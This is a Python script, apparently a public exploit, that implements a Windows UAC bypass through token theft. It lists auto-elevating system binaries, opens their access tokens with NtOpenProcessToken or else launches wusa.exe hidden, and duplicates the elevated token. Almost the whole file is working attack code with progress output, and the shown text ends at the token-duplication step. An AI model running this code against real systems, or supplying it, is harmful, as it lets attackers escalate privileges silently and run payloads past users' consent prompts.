# -*- coding: utf-8 -*-
# All credits go to CIA: https://gist.github.com/hfiref0x/59c689a14f1fc2302d858ae0aa3f6b86 (please don't hack me <3 :))
# This is trully a Always Notify UAC Bypass,cause it uses process enumeration to find elevated processes. Since you need administrative privileges to get TOKEN_ELEVATION,we look for processes with manifests that have <autoElevate></autoElevate> set to True.
from ctypes.wintypes import *
from ctypes import *
from enum import IntEnum

kernel32 = WinDLL('kernel32', use_last_error=True)
advapi32 = WinDLL('advapi32', use_last_error=True)
shell32  = WinDLL('shell32' , use_last_error=True)
ntdll 	 = WinDLL('ntdll'   , use_last_error=True)
psapi    = WinDLL('psapi'   , use_last_error=True)


# The SECURITY_IMPERSONATION_LEVEL enumeration contains values that specify security impersonation levels. Security impersonation levels govern the degree to which a server process can act on behalf of a client process.
# or https://gist.github.com/christoph2/9c390e5c094796903097   # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379572(v=vs.85).aspx
class SECURITY_IMPERSONATION_LEVEL(c_int):                    # typedef enum _SECURITY_IMPERSONATION_LEVEL {
    SecurityAnonymous       = 0                               # SecurityAnonymous      The server process cannot obtain identification information about the client, and it cannot impersonate the client.
    SecurityIdentification  = SecurityAnonymous + 1           # SecurityIdentification The server process can obtain information about the client, such as security identifiers and privileges, but it cannot impersonate the client.
    SecurityImpersonation   = SecurityIdentification + 1      # SecurityImpersonation  The server process can impersonate the client's security context on its local system.

                                                               # https://docs.python.org/3/library/ctypes.html#specifying-the-required-argument-types-function-prototypes
class c_enum(IntEnum):                                        # A ctypes-compatible IntEnum superclass that implements the class method
    @classmethod                                              # https://docs.python.org/3/library/functions.html#classmethod
    def from_param(cls, obj):                                 # Define the class method `from_param`.
        return c_int(cls(obj))                                # The obj argument to the from_param method is the object instance, in this case the enumerated value itself. Any Enum with an integer value can be directly cast to int. TokenElevation -> TOKEN_INFORMATION_CLASS.TokenElevation

# The TOKEN_INFORMATION_CLASS enumeration contains values that specify the type of information being assigned to or retrieved from an access token.
                                                               # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379626(v=vs.85).aspx
class TOKEN_INFORMATION_CLASS(c_enum):                        # typedef enum _TOKEN_INFORMATION_CLASS {
    TokenIntegrityLevel    = 25                               # TokenIntegrityLevel The buffer receives a TOKEN_MANDATORY_LABEL structure that specifies the token's integrity level.

# The TOKEN_TYPE enumeration contains values that differentiate between a primary token and an impersonation token.
                                                               # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379633(v=vs.85).aspx
class TOKEN_TYPE(c_enum):                         	      # typedef enum tagTOKEN_TYPE {
	TokenPrimary           = 1                            # TokenPrimary       Indicates a primary token.
	TokenImpersonation     = 2                            # TokenImpersonation Indicates an impersonation token.

# RIDs are used to specify mandatory integrity level.
class IntegrityLevel(object):                                  # https://msdn.microsoft.com/en-us/library/bb625963.aspx
    SECURITY_MANDATORY_UNTRUSTED_RID         = 0x00000000     # Untrusted level                   - S-1-16-0
    SECURITY_MANDATORY_LOW_RID               = 0x00001000     # Low integrity level               - S-1-16-4096
    SECURITY_MANDATORY_MEDIUM_RID            = 0x00002000     # Medium integrity level            - S-1-16-8192
    SECURITY_MANDATORY_MEDIUM_PLUS_RID = SECURITY_MANDATORY_MEDIUM_RID + 0x100 # Medium Plus Integrity Level - S-1-16-8448
    SECURITY_MANDATORY_HIGH_RID              = 0X00003000     # High integrity level              - S-1-16-12288
    SECURITY_MANDATORY_SYSTEM_RID            = 0x00004000     # System integrity level            - S-1-16-16384
    SECURITY_MANDATORY_PROTECTED_PROCESS_RID = 0x00005000     # Protected-process Integrity Level - S-1-16-20480

class GroupAttributes(object):
    SE_GROUP_ENABLED            = 0x00000004
    SE_GROUP_ENABLED_BY_DEFAULT = 0x00000002                  # The SID is enabled by default.
    SE_GROUP_INTEGRITY          = 0x00000020                  # The SID is a mandatory integrity SID.
    SE_GROUP_INTEGRITY_ENABLED  = 0x00000040                  # The SID is enabled for mandatory integrity checks.
    SE_GROUP_LOGON_ID           = 0xC0000000                  # The SID is a logon SID that identifies the logon session associated with an access token.
    SE_GROUP_MANDATORY          = 0x00000001                  # The SID cannot have the SE_GROUP_ENABLED attribute cleared by a call to the AdjustTokenGroups function.
    SE_GROUP_OWNER              = 0x00000008                  # The SID identifies a group account for which the user of the token is the owner of the group, or the SID can be assigned as the owner of the token or objects.
    SE_GROUP_RESOURCE           = 0x20000000                  # The SID identifies a domain-local group.
    SE_GROUP_USE_FOR_DENY_ONLY  = 0x00000010                  # The SID is a deny-only SID in a restricted token. When the system performs an access check, it checks for access-denied ACEs that apply to the SID; it ignores access-allowed ACEs for the SID.

LPCTSTR = c_char_p
# Contains information used by ShellExecuteEx.
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/bb759784(v=vs.85).aspx
class ShellExecuteInfo(Structure):                                        # typedef struct _SHELLEXECUTEINFO
    _fields_ = [                                                          # {
                ('cbSize',                       DWORD),                  # DWORD     cbSize;
                ('fMask',                        ULONG),                  # ULONG     fMask;
                ('hwnd',                          HWND),                  # HWND      hwnd;
		('lpVerb',                     LPCTSTR),        	  # LPCTSTR   lpVerb;
                ('lpFile',                     LPCTSTR),                  # LPCTSTR   lpFile;
                ('lpParameters',               LPCTSTR),                  # LPCTSTR   lpParameters;
                ('lpDirectory',                LPCTSTR),                  # LPCTSTR   lpDirectory;
                ('nShow',                        c_int),                  # int       nShow;
                ('hInstApp',                 HINSTANCE),                  # HINSTANCE hInstApp;
                ('lpIDList',                    LPVOID),                  # LPVOID    lpIDList;
                ('lpClass',                      LPSTR),                  # LPCTSTR   lpClass;
                ('hKeyClass',                     HKEY),                  # HKEY      hkeyClass;
                ('dwHotKey',                     DWORD),                  # DWORD     dwHotKey;
                ('hIcon',                       HANDLE),                  # union { HANDLE hIcon; HANDLE hMonitor;}
                ('hProcess',                    HANDLE)                   # HANDLE    hProcess;
                ]                                                         # }


# The SECURITY_ATTRIBUTES structure contains the security descriptor for an object and specifies whether the handle retrieved by specifying this structure is inheritable.
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379560(v=vs.85).aspx
class SECURITY_ATTRIBUTES(Structure):                                     # typedef struct _SECURITY_ATTRIBUTES
    _fields_ = [				                          # {
               ('nLength',                     DWORD),                    # DWORD  nLength;
               ('lpSecurityDescriptor',       LPVOID),                    # LPVOID lpSecurityDescriptor;
               ('bInheritHandle',               BOOL)                     # BOOL   bInheritHandle;
    	       ]

                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379598(v=vs.85).aspx
class SID_IDENTIFIER_AUTHORITY(Structure):                                # typedef struct _SID_IDENTIFIER_AUTHORITY
    _fields_ = [                                                          # {
	       ('Value', BYTE * 6)                                        # BYTE Value[6];
               ]                                                          # }

PSID = c_void_p
# The SID_AND_ATTRIBUTES structure represents a security identifier (SID) and its attributes. SIDs are used to uniquely identify users or groups
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/aa379595(v=vs.85).aspx
class SID_AND_ATTRIBUTES(Structure):                                      # typedef struct _SID_AND_ATTRIBUTES
    _fields_ = [                                                          # {
               ('Sid',         PSID),                                     # PSID  Sid;
               ('Attributes',  DWORD)                                     # DWORD Attributes;
               ]                                                          # }
# The TOKEN_MANDATORY_LABEL structure specifies the mandatory integrity level for a token.
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/bb394727(v=vs.85).aspx
class TOKEN_MANDATORY_LABEL(Structure):                                   # typedef struct _TOKEN_MANDATORY_LABEL
    _fields_ = [                                                          # {
               ('Label', SID_AND_ATTRIBUTES),                        	  # SID_AND_ATTRIBUTES Label;
    	       ]                                                     	  # }

LPTSTR = c_void_p
LPBYTE = c_char_p
# Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/ms686331(v=vs.85).aspx
class STARTUPINFO(Structure):                                             # typedef struct _STARTUPINFO
    _fields_ = [                                                          # {
               ('cb',               DWORD),                               # DWORD  cb;
               ('lpReserved',       LPTSTR),                              # LPTSTR lpReserved;
               ('lpDesktop',        LPTSTR),                              # LPTSTR lpDesktop;
               ('lpTitle',          LPTSTR),                              # LPTSTR lpTitle;
               ('dwX',              DWORD),                               # DWORD  dwX;
               ('dwY',              DWORD),                               # DWORD  dwY;
               ('dwXSize',          DWORD),                               # DWORD  dwXSize;
               ('dwYSize',          DWORD),                               # DWORD  dwYSize;
               ('dwXCountChars',    DWORD),                               # DWORD  dwXCountChars;
               ('dwYCountChars',    DWORD),                               # DWORD  dwYCountChars;
               ('dwFillAttribute',  DWORD),                               # DWORD  dwFillAttribute;
               ('dwFlags',          DWORD),                               # DWORD  dwFlags;
               ('wShowWindow',       WORD),                               # WORD   wShowWindow;
               ('cbReserved2',       WORD),                               # WORD   cbReserved2;
               ('lpReserved2',     LPBYTE),                               # LPBYTE lpReserved2;
               ('hStdInput',       HANDLE),                               # HANDLE hStdInput;
               ('hStdOutput',      HANDLE),                               # HANDLE hStdOutput;
               ('hStdError',       HANDLE)                                # HANDLE hStdError;
               ]                                                          # }

# Contains information about a newly created process and its primary thread. It is used with the CreateProcess, CreateProcessAsUser, CreateProcessWithLogonW, or CreateProcessWithTokenW function.
                                                                           # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684873(v=vs.85).aspx
class PROCESS_INFORMATION(Structure):                                     # typedef struct _PROCESS_INFORMATION
    _fields_ = [                                                          # {
               ('hProcess',    HANDLE),                                   # HANDLE hProcess;
               ('hThread',     HANDLE),                                   # HANDLE hThread;
               ('dwProcessId',  DWORD),                                   # DWORD  dwProcessId;
               ('dwThreadId',   DWORD)                                    # DWORD  dwThreadId;
               ]                                                          # } 


# NTSTATUS | https://msdn.microsoft.com/en-us/library/cc704588.aspx
NTSTATUS = c_ulong
STATUS_UNSUCCESSFUL = NTSTATUS(0xC0000001)     # {Operation Failed} The requested operation was unsuccessful.

# Process access rights for OpenProcess | https://msdn.microsoft.com/en-us/library/windows/desktop/ms684880(v=vs.85).aspx
PROCESS_QUERY_LIMITED_INFORMATION   = 0x1000   # Required to retrieve certain information about a process = see GetExitCodeProcess, GetPriorityClass, IsProcessInJob, QueryFullProcessImageName #. A handle that has the PROCESS_QUERY_INFORMATION access right is automatically granted PROCESS_QUERY_LIMITED_INFORMATION.  Windows Server 2003 and Windows XP:  This access right is not supported.

# Maximum Path Length Limitation | https://msdn.microsoft.com/en-us/library/windows/desktop/aa365247(v=vs.85).aspx
MAX_PATH = 260                                 # In the Windows API, the maximum length for a path is MAX_PATH, which is defined as 260 characters.

# ACCESS_MASK | https://msdn.microsoft.com/en-us/library/cc230294.aspx
MAXIMUM_ALLOWED = 0x02000000                   # When used in an Access Request operation, the Maximum Allowed bit grants the requestor the maximum permissions allowed to the object through the Access Check Algorithm. This bit can only be requested, it cannot be set in an ACE

# dwLogonFlags [in]
LOGON_NETCREDENTIALS_ONLY = 0x00000002         # Log on, but use the specified credentials on the network only. The new process uses the same token as the caller, but the system creates a new logon session within LSA, and the process uses the specified credentials as the default credentials.

# Standard access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa379607(v=vs.85).aspx
SYNCHRONIZE                     = 0x00100000   # The right to use the object for synchronization. This enables a thread to wait until the object is in the signaled state.
DELETE                          = 0x00010000   # The right to delete the object
READ_CONTROL                    = 0x00020000   # The right to read the information in the object's security descriptor, not including the information in the system access control list (SACL). To read or write the SACL, you must request the ACCESS_SYSTEM_SECURITY access right.
WRITE_DAC                       = 0x00040000   # Required to modify the DACL in the security descriptor for the object.
WRITE_OWNER                     = 0x00080000   # Required to change the owner in the security descriptor for the object.
STANDARD_RIGHTS_READ            = READ_CONTROL # Currently defined to equal READ_CONTROL
STANDARD_RIGHTS_WRITE           = READ_CONTROL # Currently defined to equal READ_CONTROL
STANDARD_RIGHTS_REQUIRED        = 0x000F0000   # Combines DELETE, READ_CONTROL, WRITE_DAC, and WRITE_OWNER access

# Token access rights | https://msdn.microsoft.com/en-us/library/windows/desktop/aa374905(v=vs.85).aspx
TOKEN_ADJUST_PRIVILEGES         = 0x00000020   # Required to enable or disable the privileges in an access token
TOKEN_QUERY                     = 0x00000008   # Required to query an access token
TOKEN_ASSIGN_PRIMARY            = 0x0001       # Required to attach a primary token to a process. The SE_ASSIGNPRIMARYTOKEN_NAME privilege is also required to accomplish this task
TOKEN_DUPLICATE                 = 0x0002       # Required to duplicate an access token
TOKEN_IMPERSONATE               = 0x0004       # Required to attach an impersonation access token to a process
TOKEN_QUERY_SOURCE              = 0x0010       # Required to query the source of an access token
TOKEN_ADJUST_GROUPS             = 0x0040       # Required to adjust the attributes of the groups in an access token
TOKEN_ADJUST_DEFAULT            = 0x0080       # Required to change the default owner, primary group, or DACL of an access token
TOKEN_ADJUST_SESSIONID          = 0x0100       # Required to adjust the session ID of an access token. The SE_TCB_NAME privilege is required
TOKEN_READ                      = (STANDARD_RIGHTS_READ | TOKEN_QUERY)               # Combines STANDARD_RIGHTS_READ and TOKEN_QUERY.
TOKEN_ALL_ACCESS                = (STANDARD_RIGHTS_REQUIRED                          # Combines all possible access rights for a token.
                                 | TOKEN_ASSIGN_PRIMARY
                                 | TOKEN_DUPLICATE
                                 | TOKEN_IMPERSONATE
                                 | TOKEN_QUERY
                                 | TOKEN_QUERY_SOURCE
                                 | TOKEN_ADJUST_PRIVILEGES
                                 | TOKEN_ADJUST_GROUPS
                                 | TOKEN_ADJUST_DEFAULT
                                 | TOKEN_ADJUST_SESSIONID)


# Win32 API function definitions
                                                                                      # https://msdn.microsoft.com/en-us/library/windows/desktop/ff818516(v=vs.85).aspx

#Retrieves the calling thread's last-error code value. The last-error code is maintained on a per-thread basis. Multiple threads do not overwrite each other's last-error code.
GetLastError = kernel32.GetLastError                                   # https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
GetLastError.restype = DWORD                                          # DWORD WINAPI GetLastError(void);

PDWORD = POINTER(DWORD)
# Retrieves the process identifier for each process object in the system.
EnumProcesses = psapi.EnumProcesses                                    # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682629(v=vs.85).aspx
EnumProcesses.restype = BOOL                                          # BOOL WINAPI EnumProcesses
EnumProcesses.argtypes = [                                            # (
                PDWORD,                                               # DWORD *pProcessIds,
                DWORD,                                                # DWORD cb,
                PDWORD                                                # DWORD *pBytesReturned
                ]                                                     # );

# Opens an existing local process object.
OpenProcess = kernel32.OpenProcess                                     # https://msdn.microsoft.com/en-us/library/windows/desktop/ms684320(v=vs.85).aspx
OpenProcess.restype = HANDLE                                          # HANDLE WINAPI OpenProcess
OpenProcess.argtypes = [                                              # (
                DWORD,                                                # DWORD dwDesiredAccess,
                BOOL,                                                 # BOOL  bInheritHandle,
                DWORD                                                 # DWORD dwProcessId
                ]                                                     # );

# Retrieves the name of the executable file for the specified process.
GetProcessImageFileName = psapi.GetProcessImageFileNameA               # https://msdn.microsoft.com/en-us/library/windows/desktop/ms683217(v=vs.85).aspx
GetProcessImageFileName.restype = DWORD                               # DWORD WINAPI GetProcessImageFileName
GetProcessImageFileName.argtypes = [                                  # (
                HANDLE,                                               # HANDLE hprocess,
                LPTSTR,                                               # LPTSTR lpImageFileName,
                DWORD                                                 # DWORD  nSize
                ]                                                     # );

# Closes an open object handle.
CloseHandle = kernel32.CloseHandle                                     # https://msdn.microsoft.com/en-us/library/windows/desktop/ms724211(v=vs.85).aspx
CloseHandle.restype = BOOL                                            # BOOL WINAPI CloseHandle
CloseHandle.argtypes =  [                                             # (
               HANDLE                                                 # HANDLE hObject
               ]                                                      # );


PHANDLE = POINTER(HANDLE)
# The NtOpenProcessToken function opens the access token associated with a process
NtOpenProcessToken = ntdll.NtOpenProcessToken          		       # https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FToken%2FNtOpenProcessToken.html
NtOpenProcessToken.restype = BOOL                                     # BOOL WINAPI NtOpenProcessToken
NtOpenProcessToken.argtypes = [			                      # (
	        HANDLE,                                  	      # HANDLE  ProcessHandle,
     	        DWORD,                                   	      # DWORD   DesiredAccess,
	        PHANDLE	                 	      	   	      # PHANDLE TokenHandle
	        ]		                              	      # );

PShellExecuteInfo = POINTER(ShellExecuteInfo)
# Performs an operation on a specified file.
ShellExecuteEx = shell32.ShellExecuteEx                                # https://msdn.microsoft.com/en-us/library/windows/desktop/bb762154(v=vs.85).aspx
ShellExecuteEx.restype = BOOL                                         # BOOL ShellExecuteEx
ShellExecuteEx.argtypes = [                                           # (
                PShellExecuteInfo                                     # SHELLEXECUTEINFO *pExecInfo
                ]                                                     # );
# Terminates the specified process and all of its threads.
TerminateProcess = kernel32.TerminateProcess                           # https://msdn.microsoft.com/en-us/library/windows/desktop/ms686714(v=vs.85).aspx
TerminateProcess.restype = BOOL                                       # BOOL WINAPI TerminateProcess
TerminateProcess.argtypes = [                                         # (
                HANDLE,                                               # HANDLE hProcess,
                UINT                                                  # UINT   uExitCode
                ]                                                     # );

# Waits until the specified object is in the signaled state or the time-out interval elapses.
WaitForSingleObject = kernel32.WaitForSingleObject                     # https://msdn.microsoft.com/en-us/library/windows/desktop/ms687032(v=vs.85).aspx
WaitForSingleObject.restype = DWORD                                   # DWORD WINAPI WaitForSingleObject
WaitForSingleObject.argtypes = [                                      # (
                HANDLE,                                               # HANDLE hHandle,
                DWORD                                                 # DWORD  dwMilliseconds
                ]                                                     # );


PSECURITY_ATTRIBUTES = POINTER(SECURITY_ATTRIBUTES)
LPSECURITY_ATTRIBUTES = PSECURITY_ATTRIBUTES
# The DuplicateTokenEx function creates a new access token that duplicates an existing token. This function can create either a primary token or an impersonation token.
DuplicateTokenEx = advapi32.DuplicateTokenEx                           # https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx
DuplicateTokenEx.restype  = BOOL                                      # BOOL WINAPI DuplicateTokenEx
DuplicateTokenEx.argtypes = [                                         # (
                HANDLE,                                               # HANDLE                       hExistingToken,
                DWORD,                                                # DWORD                        dwDesiredAccess,
                LPSECURITY_ATTRIBUTES,                                # LPSECURITY_ATTRIBUTES        lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL,                         # SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                TOKEN_TYPE,                                           # TOKEN_TYPE                   TokenType,
                PHANDLE                                               # PHANDLE                      phNewToken
                ]                                                     # );

PSID_IDENTIFIER_AUTHORITY = POINTER(SID_IDENTIFIER_AUTHORITY)
PSID = LPVOID

# The AllocateAndInitializeSid function allocates and initializes a security identifier (SID) with up to eight subauthorities.
RtlAllocateAndInitializeSid = ntdll.RtlAllocateAndInitializeSid        # https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/ntifs/nf-ntifs-rtlallocateandinitializesid
RtlAllocateAndInitializeSid.restype = BOOL                            # BOOL WINAPI AllocateAndInitializeSid
RtlAllocateAndInitializeSid.argtypes = [                              # (
                PSID_IDENTIFIER_AUTHORITY,                            # PSID_IDENTIFIER_AUTHORITY pIdentifierAuthority,
                BYTE,                                                 # BYTE                      nSubAuthorityCount,
                DWORD,                                                # DWORD                     dwSubAuthority0,
                DWORD,                                                # DWORD                     dwSubAuthority1,
                DWORD,                                                # DWORD                     dwSubAuthority2,
                DWORD,                                                # DWORD                     dwSubAuthority3,
                DWORD,                                                # DWORD                     dwSubAuthority4,
                DWORD,                                                # DWORD                     dwSubAuthority5,
                DWORD,                                                # DWORD                     dwSubAuthority6,
                DWORD,                                                # DWORD                     dwSubAuthority7,
                PSID                                                  # PSID                      *pSid
                ]                                                     # );

PVOID = c_void_p
# The NtSetInformationToken routine modifies information in a specified token. The calling process must have appropriate access rights to set the information.
NtSetInformationToken = ntdll.NtSetInformationToken                    # http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FToken%2FNtSetInformationToken.html
NtSetInformationToken.restype = NTSTATUS                              # NTSTATUS NtSetInformationToken
NtSetInformationToken.argtypes = [                                    # (
                HANDLE,                                               # HANDLE                  TokenHandle,
                TOKEN_INFORMATION_CLASS,                              # TOKEN_INFORMATION_CLASS TokenInformationClass,
                PVOID,                                                # PVOID                   TokenInformation,
                ULONG                                                 # ULONG                   TokenInformationLength
                ]                                                     # );

PTOKEN_GROUPS     = LPVOID
PTOKEN_PRIVILEGES = LPVOID
PTOKEN_GROUPS     = LPVOID
# The NtFilterToken function creates a new access token that is a restricted version of an existing access token. The restricted token can have disabled security identifiers (SIDs), deleted privileges, and a list of restricting SIDs.
NtFilterToken = ntdll.NtFilterToken                                    # http://processhacker.sourceforge.net/doc/ntseapi_8h.html#a6c8116a540c7695a1fcd48a0d302cac4
NtFilterToken.restype = NTSTATUS                                      # NTSTATUS NtFilterToken
NtFilterToken.argtypes = [                                            # (
                HANDLE,                                               # HANDLE             ExistingTokenHandle,
                ULONG,                                                # ULONG  	           Flags,
                PTOKEN_GROUPS,                                        # PTOKEN_GROUPS  	   SidsToDisable,
                PTOKEN_PRIVILEGES,                                    # PTOKEN_PRIVILEGES  PrivilegesToDelete,
                PTOKEN_GROUPS,                                        # PTOKEN_GROUPS  	   RestrictedSids,
                PHANDLE                                               # PHANDLE  	   NewTokenHandle
                ]                                                     # );

# The ImpersonateLoggedOnUser function lets the calling thread impersonate the security context of a logged-on user. The user is represented by a token handle.
ImpersonateLoggedOnUser = advapi32.ImpersonateLoggedOnUser             # https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx
ImpersonateLoggedOnUser.restype = BOOL                                # BOOL WINAPI ImpersonateLoggedOnUser
ImpersonateLoggedOnUser.argtypes = [                                  # (
                HANDLE                                                # HANDLE hToken
                ]                                                     # );


LPSTARTUPINFO         = POINTER(STARTUPINFO)
LPPROCESS_INFORMATION = POINTER(PROCESS_INFORMATION)
# Creates a new process and its primary thread. Then the new process runs the specified executable file in the security context of the specified credentials (user, domain, and password). It can optionally load the user profile for a specified user.
CreateProcessWithLogonW = advapi32.CreateProcessWithLogonW             # https://msdn.microsoft.com/en-us/library/windows/desktop/ms682431(v=vs.85).aspx
CreateProcessWithLogonW.restype	= BOOL                                # BOOL WINAPI CreateProcessWithLogonW
CreateProcessWithLogonW.argtypes = [                                  # (
                LPCWSTR,                                              # LPCWSTR               lpUsername,
                LPCWSTR,                                              # LPCWSTR               lpDomain,
                LPCWSTR,                                              # LPCWSTR               lpPassword,
                DWORD,                                                # DWORD                 dwLogonFlags,
                LPCWSTR,                                              # LPCWSTR               lpApplicationName,
                LPWSTR,                                               # LPWSTR                lpCommandLine,
                DWORD,                                                # DWORD                 dwCreationFlags,
                LPVOID,                                               # LPVOID                lpEnvironment,
                LPCWSTR,                                              # LPCWSTR               lpCurrentDirectory,
                LPSTARTUPINFO,                                        # LPSTARTUPINFOW        lpStartupInfo,
                LPPROCESS_INFORMATION                                 # LPPROCESS_INFORMATION lpProcessInfo
                ]                                                     # );

INVALID_HANDLE_VALUE = c_void_p(-1).value
# If it finds a elevated processes it's Always Notify bypass,if it needs to trigger 'wusa.exe' it will only show prompt for wusa.exe not our payload, all other levels are bypassable either way.
elevatedprocesses = "ComputerDefaults.exe", "dccw.exe", "EASPolicyManagerBrokerHost.exe", "immersivetpmvscmgrsvr.exe", "iscsicpl.exe", "lpksetup.exe", "mmc.exe", "msconfig.exe", "odbcad32.exe", "recdisc.exe", "shrpubw.exe", "SystemPropertiesAdvanced.exe", "SystemPropertiesComputerName.exe", "SystemPropertiesDataExecutionPrevention.exe", "SystemPropertiesHardware.exe", "SystemPropertiesPerformance.exe", "SystemPropertiesProtection.exe", "SystemPropertiesRemote.exe", "SystemSettingsAdminFlows.exe", "Taskmgr.exe", "tcmsetup.exe", "TpmInit.exe", "WindowsUpdateElevatedInstaller.exe", "wusa.exe"
# https://msdn.microsoft.com/en-us/library/windows/desktop/ms682623(v=vs.85).aspx
DWORD_array        = (DWORD *  0xFFFF)
ProcessIds         = DWORD_array()
ProcessIdsSize     = sizeof(ProcessIds)
ProcessesReturned  = DWORD()
EnumProcesses(
                           ProcessIds,                                      # _Out_  pProcessIds        A pointer to an array that receives the list of process identifiers.
                           ProcessIdsSize,                                  # _In_   cb                 The size of the pProcessIds array, in bytes.
                           ProcessesReturned)                               # _Out_  pBytesReturned     The number of bytes returned in the pProcessIds array.
foundelevatedprocess = False
RunningProcesses = ProcessesReturned.value / sizeof(DWORD)
for process in range(RunningProcesses):
    ProcessId = ProcessIds[process]
    currenthandle = OpenProcess(
                           PROCESS_QUERY_LIMITED_INFORMATION,               # _In_  dwDesiredAccess     The access to the process object. This access right is checked against the security descriptor for the process. If the caller has enabled the SeDebugPrivilege privilege, the requested access is granted regardless of the contents of the security descriptor.
                           False,                                           # _In_  bInheritHandle      If this value is TRUE, processes created by this process will inherit the handle. Otherwise, the processes do not inherit this handle.
                           ProcessId)                                       # _In_  dwProcessId         The identifier of the local process to be opened.
    if currenthandle:
        ProcessName = (c_char * MAX_PATH)()
        if GetProcessImageFileName(
                           currenthandle,                                   # _In_  hProcess            A handle to the process. The handle must have the PROCESS_QUERY_INFORMATION or PROCESS_QUERY_LIMITED_INFORMATION access right.
                           ProcessName,                                     # _Out_ lpImageFileName     A pointer to a buffer that receives the full path to the executable file.
                           MAX_PATH):                                       # _In_  nSize               The size of the lpImageFileName buffer, in characters.
            ProcessName = ProcessName.value.split("\\")[-1]  # Since GetProcessImageFileName function returns the path in device form we grab the process name with split on what's followed after the last slash. \Device\Harddisk0\Partition1\Windows\System32\wusa.exe -> wusa.exe
            for elevatedprocess in elevatedprocesses:
                if not foundelevatedprocess:
                    if ProcessName == elevatedprocess:
                        hToken = HANDLE(INVALID_HANDLE_VALUE)
                        knackcrack = NtOpenProcessToken(
                            currenthandle,                    	            # _In_  ProcessHandle       A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.
                            MAXIMUM_ALLOWED,                  		    # _In_  DesiredAccess       Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.
                            byref(hToken))                    		    # _Out_ TokenHandle         A pointer to a handle that identifies the newly opened access token when the function returns.
                        if knackcrack >= 0:
                            print "[*] Found elevated process", ProcessName,"with PID:", ProcessId
                            print "\t[+] Grabbing token"
                            foundelevatedprocess = True
    CloseHandle(currenthandle)                                              # _In_  hObject             A valid handle to an open object.

if not foundelevatedprocess:
    SW_HIDE = 0
    SEE_MASK_NOCLOSEPROCESS = 0x00000040
    ShellExecute = ShellExecuteInfo()
    ShellExecute.cbSize = sizeof(ShellExecute)
    ShellExecute.fMask = SEE_MASK_NOCLOSEPROCESS  # SEE_MASK_NOCLOSEPROCESS (0x00000040) Use to indicate that the hProcess member receives the process handle.
    ShellExecute.lpFile = u"wusa.exe"
    ShellExecute.nShow = SW_HIDE
    knacrack420 = ShellExecuteEx(
                            byref(ShellExecute))                            # _Inout_  *pExecInfo       A pointer to a SHELLEXECUTEINFO structure that contains and receives information about the application being executed.
    if knacrack420 == 0:
        raise RuntimeError("Error while triggering elevated binary using ShellExecuteEx: %s" %GetLastError())
    print "[*] Elevated process was not detected, triggering wusa.exe"
    print "\t[+] Grabbing token"
	
    hToken = HANDLE(INVALID_HANDLE_VALUE)
    knackcrack = NtOpenProcessToken(
                            ShellExecute.hProcess,                          # _In_  ProcessHandle       A handle to the process whose access token is opened. The process must have the PROCESS_QUERY_INFORMATION access permission.
                            MAXIMUM_ALLOWED,                                # _In_  DesiredAccess       Specifies an access mask that specifies the requested types of access to the access token. These requested access types are compared with the discretionary access control list (DACL) of the token to determine which accesses are granted or denied.
                            byref(hToken))                                  # _Out_ TokenHandle         A pointer to a handle that identifies the newly opened access token when the function returns.
    if knackcrack == STATUS_UNSUCCESSFUL:
        raise RuntimeError("Error while opening target process token using NtOpenProcessToken: %s" %GetLastError())
    print "[*] Opening token of elevated process"

    TerminateProcess(
                           ShellExecute.hProcess,                           # _In_  hProcess            A handle to the process to be terminated.
                           -1)                                              # _In_  uExitCode           The exit code to be used by the process and threads terminated as a result of this call.
    INFINITE = -1
    WaitForSingleObject(
                           ShellExecute.hProcess,                           # _In_  hHandle             A handle to the object. For a list of the object types whose handles can be specified, see the following Remarks section.
                           INFINITE)                                        # _In_  dwMilliseconds      The time-out interval, in milliseconds. If a nonzero value is specified, the function waits until the object is signaled or the interval elapses.

newhToken = HANDLE(INVALID_HANDLE_VALUE)
SECURITY_ATTRIBUTES = SECURITY_ATTRIBUTES()
knacrack = DuplicateTokenEx(
                           hToken,                                          # _In_     hExistingToken     A handle to an access token opened with TOKEN_DUPLICATE access.
                           TOKEN_ALL_ACCESS,                                # _In_    dwDesiredAccess    Specifies the requested access rights for the new token. The DuplicateTokenEx function compares the requested access rights with the existing token's discretionary access control list (DACL) to determine which rights are granted or denied. To request the same access rights as the existing token, specify zero. To request all access rights that are valid for the caller, specify MAXIMUM_ALLOWED.
                           byref(SECURITY_ATTRIBUTES),                      # _In_opt_ lpTokenAttributes  A pointer to a SECURITY_ATTRIBUTES structure that specifies a security descriptor for the new token and determines whether child processes can inherit the token.
                        SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, # _In_     ImpersonationLevel Specifies a value from the SECURITY_IMPERSONATION_LEVEL enumeration that indicates the impersonation level of the new token.
                           TOKEN_TYPE.TokenPrimary,                         # _In_     TokenType          Specifies a value from the TOKEN_TYPE enumeration. TokenImpersonation -> The new token is an impersonation token.
                           byref(newhToken))                                # _Out_    phNewToken         A pointer to a HANDLE variable that receives the new token.
if knacrack == STATUS_UNSUCCESSFUL:
    raise RuntimeError("Error while duplicating Primary token using DuplicateTokenEx: %s" %GetLastError())
print "[*] Duplicating primary token"

# https://msdn.microsoft.com/en-us/library/bb625963.aspx
